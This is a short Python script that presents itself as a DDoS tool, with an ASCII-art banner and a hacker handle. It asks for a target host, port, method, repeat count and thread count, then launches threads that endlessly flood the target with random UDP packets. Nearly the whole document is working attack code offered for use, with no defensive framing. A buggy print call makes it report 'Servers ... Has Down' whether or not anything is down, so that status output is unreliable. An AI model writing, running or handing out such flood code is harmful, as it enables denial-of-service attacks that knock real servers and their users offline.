#byginn
import random 
import socket
import threading
import os , sys

print ('''
██████╗░██████╗░░█████╗░░██████╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░''')
print("              =======TCP UDP DDOS TOOLS=======                             ")
print("             =======Create Date :2-23-22=======                             ")
print("              =======FL3X G1N MU5K =======                          ")
ip = str(input(" Host :"))
port = int(input(" Port :"))
choice = str(input(" Method :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
os.system("clear")
def udp():
	data = random._urandom(811)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m [G1N MU5K B@NT@1] Attacking Ip %s \\033[91m And Port %s"%(ip,port))
		except:
			print("\033[91m Servers %s Has Down %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()